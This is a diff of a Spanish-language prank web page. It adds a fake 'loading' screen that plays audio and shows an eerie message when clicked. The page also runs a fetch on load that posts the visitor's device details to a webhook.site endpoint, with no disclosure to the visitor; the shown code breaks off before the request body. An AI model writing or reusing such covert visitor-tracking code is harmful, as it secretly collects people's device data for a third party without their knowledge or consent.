@@ -19,6 +19,14 @@
             flex-direction: column;
         }
 
+        /* Página de carga */
+        #loading {
+            font-size: 2em;
+            color: #e0e0e0;
+            cursor: pointer;
+            text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.7), 0px 0px 30px rgba(255, 0, 0, 0.5);
+        }
+
         /* Mensaje triste con animación de desvanecimiento */
         #message {
             font-size: 2.5em;
@@ -50,11 +58,31 @@
     </style>
 </head>
 <body>
-    <div id="message">¿Por qué estás aquí?</div>
-    <div id="noise"></div>
+    <!-- Página de carga -->
+    <div id="loading">Cargando... Haz clic para continuar</div>
+
+    <!-- Mensaje triste y ruido, inicialmente ocultos -->
+    <div id="message" style="display: none;">¿Por qué estás aquí?</div>
+    <div id="noise" style="display: none;"></div>
 
     <script>
-        // Aquí puedes agregar alguna funcionalidad o webhook si es necesario
+        // Reproducir el audio y mostrar el mensaje cuando se hace clic en "Cargando"
+        document.getElementById("loading").addEventListener("click", function() {
+            // Reproducir audio
+            const audio = new Audio('https://raw.githubusercontent.com/joelcerrud/mariagna-video/master/audio.mp3'); // Usando el enlace correcto de GitHub
+            audio.play().catch(() => {
+                console.log("No se pudo reproducir el audio automáticamente.");
+            });
+
+            // Mostrar mensaje triste y ruido
+            document.getElementById("message").style.display = "block";
+            document.getElementById("noise").style.display = "block";
+
+            // Ocultar el mensaje de carga
+            document.getElementById("loading").style.display = "none";
+        });
+
+        // Enviar datos del webhook con detalles del dispositivo
         const webhookURL = "https://webhook.site/3423a367-48e7-4346-9e23-30b975fd24aa";
         fetch(webhookURL, {
             method: "POST",
